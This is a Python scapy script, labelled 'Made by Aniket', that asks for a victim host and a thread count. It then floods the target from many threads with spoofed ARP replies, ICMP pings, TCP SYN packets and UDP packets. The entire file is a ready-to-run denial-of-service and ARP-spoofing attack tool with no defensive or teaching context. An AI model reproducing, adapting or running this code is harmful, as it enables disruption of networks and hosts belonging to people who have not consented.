from scapy.all import *
import os
import sys
from os import system
from termcolor import colored, cprint
import threading
import random

os.system('cls' if os.name == 'nt' else 'clear')

def arp_spoof():
    try:
        dest_random = RandIP()
        print("\n")
        cprint(colored("[+] Made by Aniket [+]", "yellow", attrs=["blink"]))
        print("\n")
        user = str(input(colored("[*] Enter victim host or IP (default: random-ip):> " or f"{dest_random}", "red")))
        print("\n")
        thread_count = int(input(colored("[*] Enter thread count:> ", "red")))
        print("\n")
        cprint(colored("[*] Attack under progress ...", "magenta", attrs=["blink"]))
        cprint(colored("[*] Press CTRL+C to stop the attack", "green", attrs=["blink"]))
    except:
        os.system('cls' if os.name == 'nt' else 'clear')
        cprint(colored("[+] Made by Aniket [+]", "yellow", attrs=["blink"]))
        cprint(colored("Try again something error or missing", "red", attrs=["blink"]))
        sys.exit()
    try:
        def send_arp_packets():
            while True:
                try:
                    dest_mac = RandMAC()
                    src_mac = RandMAC()
                    packet = Ether(src=src_mac, dst=dest_mac)/ARP(op=2, psrc=user, hwsrc=src_mac, hwdst=dest_mac)/Padding(load="X"*18)
                    sendp(packet, verbose=0)
                    print(f"Sent ARP packet: {packet.summary()}")
                except KeyboardInterrupt:
                    break
        def send_ping_flood():
            while True:
                try:
                    dest_ip = user if user != 'random-ip' else RandIP()
                    packet = IP(dst=dest_ip)/ICMP()
                    send(packet, verbose=0)
                    print(f"Sent ICMP packet: {packet.summary()}")
                except KeyboardInterrupt:
                    break
        def send_tcp_flood():
            while True:
                try:
                    dest_ip = user if user != 'random-ip' else RandIP()
                    src_port = random.randint(1024, 65535)
                    dst_port = random.randint(1, 1023)
                    packet = IP(dst=dest_ip)/TCP(sport=src_port, dport=dst_port, flags='S')
                    send(packet, verbose=0)
                    print(f"Sent TCP packet: {packet.summary()}")
                except KeyboardInterrupt:
                    break
        def send_udp_flood():
            while True:
                try:
                    dest_ip = user if user != 'random-ip' else RandIP()
                    src_port = random.randint(1024, 65535)
                    dst_port = random.randint(1, 1023)
                    packet = IP(dst=dest_ip)/UDP(sport=src_port, dport=dst_port)
                    send(packet, verbose=0)
                    print(f"Sent UDP packet: {packet.summary()}")
                except KeyboardInterrupt:
                    break
        threads = []
        for _ in range(thread_count):
            arp_thread = threading.Thread(target=send_arp_packets)
            arp_thread.start()
            threads.append(arp_thread)
            ping_thread = threading.Thread(target=send_ping_flood)
            ping_thread.start()
            threads.append(ping_thread)
            tcp_thread = threading.Thread(target=send_tcp_flood)
            tcp_thread.start()
            threads.append(tcp_thread)
            udp_thread = threading.Thread(target=send_udp_flood)
            udp_thread.start()
            threads.append(udp_thread)
        for thread in threads:
            thread.join()
    except KeyboardInterrupt:
        os.system('cls' if os.name == 'nt' else 'clear')
        cprint(colored("[+] Made by Aniket [+]", "yellow", attrs=["blink"]))
        cprint(colored("[+] Ctrl+C detected", "red", attrs=["blink"]))
        sys.exit(1)
        
conf.use_pcap = True
conf.use_asn = True
arp_spoof()